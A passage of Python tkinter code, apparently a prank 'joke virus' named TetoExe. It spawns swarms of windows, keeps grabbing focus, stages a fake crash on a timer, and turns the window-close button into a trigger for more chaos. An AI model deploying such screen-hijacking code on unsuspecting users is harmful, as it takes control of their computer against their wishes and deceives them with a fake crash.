        threading.Thread(target=self.spawn_swarm, args=(10,), daemon=True).start()
        self.periodic_chaos()
        self.active_focus_grabber()

        if not _timer_started:
            _timer_started = True
            self.root.after(194000, trigger_fake_crash)

    def update_wallpaper(self):
        try:
            if self.wallpaper is None or not self.wallpaper.winfo_exists():
                return
            if not _frame_queue.empty():
                frame = _frame_queue.get_nowait()
                img = Image.fromarray(frame)
                self.wallpaper_imgtk = ImageTk.PhotoImage(image=img)
                self.wallpaper_label.config(image=self.wallpaper_imgtk)
                self.wallpaper_label.image = self.wallpaper_imgtk
            self.root.after(33, self.update_wallpaper)
        except Exception:
            pass

    def active_focus_grabber(self):
        try:
            if _crash_triggered:
                return
            for win in list(_all_windows):
                try:
                    if win.window.winfo_exists():
                        win.window.lift()
                        win.window.attributes('-topmost', True)
                except Exception:
                    pass
            self.root.after(150, self.active_focus_grabber)
        except Exception:
            pass

    def spawn_swarm(self, count):
        for i in range(count):
            if _crash_triggered:
                return
            time.sleep(0.08)
            self.root.after(0, lambda: TetoWindow())

    def periodic_chaos(self):
        try:
            if _crash_triggered:
                return
            rand_val = random.random()
            if rand_val < 0.6:
                for _ in range(random.randint(1, 2)):
                    if _crash_triggered:
                        return
                    TetoWindow()
            elif rand_val < 0.8:
                threading.Thread(target=spawn_solitaire_cascade, args=(6,), daemon=True).start()

            self.root.after(random.randint(2000, 4000), self.periodic_chaos)
        except Exception:
            pass

    def cleanup(self):
        global _video_running
        _video_running = False
        if self.wallpaper:
            try:
                self.wallpaper.destroy()
            except Exception:
                pass
        restore_system()

def main():
    app = TetoExe()
    
    def on_closing():
        if not app.chaos_started:
            app.begin_chaos()
        return "break"
    
    app.root.protocol("WM_DELETE_WINDOW", on_closing)
    app.root.mainloop()

if __name__ == "__main__":
    main()